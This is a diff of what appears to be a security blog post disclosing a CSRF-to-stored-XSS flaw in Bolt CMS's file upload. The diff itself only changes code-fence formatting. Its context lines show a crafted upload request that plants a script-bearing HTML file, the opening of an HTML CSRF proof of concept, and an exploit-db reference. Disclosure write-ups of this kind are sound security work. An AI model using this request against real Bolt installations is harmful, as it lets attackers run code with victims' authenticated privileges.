@@ -25,7 +25,7 @@ This flaw exists in the file upload section called "Files on the Stack", availab
 
 You may think, CSRF on file upload? What can I do with this? Can I pwn the server sending PHP? No, BUT you can upload HTML files!
 
-{% highlight http %}
+```http
 POST /bolt/upload HTTP/1.1
 Host: victim.com
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
@@ -44,7 +44,7 @@ Content-Type: text/markdown
 <html><script>alert("hi");</script></html>
 
 -----------------------------6228775941835128519569528722--
-{% endhighlight %}
+```
 
 This means that we, attackers, can execute arbitrary JavaScript in the same context as the application with the authenticated user privileges, which you will see how important it is for the attack.
 
@@ -127,7 +127,7 @@ Our exploration will have the following path:
 https://www.exploit-db.com/exploits/46664
 
 
-```javascript
+```html
 <html>
   <body>
   <script>history.pushState('', '', '/')</script>
@@ -238,7 +238,7 @@ https://www.exploit-db.com/exploits/46664
   </body>
 </html>
 
-```javascript
+```
 
 ## Disclosure Timeline
 
